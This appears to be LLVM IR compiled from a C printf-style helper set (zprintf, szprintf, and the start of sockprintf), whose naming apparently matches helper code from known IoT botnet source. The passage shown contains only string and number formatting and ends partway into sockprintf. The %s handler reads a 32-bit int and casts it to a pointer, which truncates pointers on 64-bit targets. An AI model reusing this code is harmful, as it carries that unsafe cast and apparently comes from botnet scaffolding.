; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
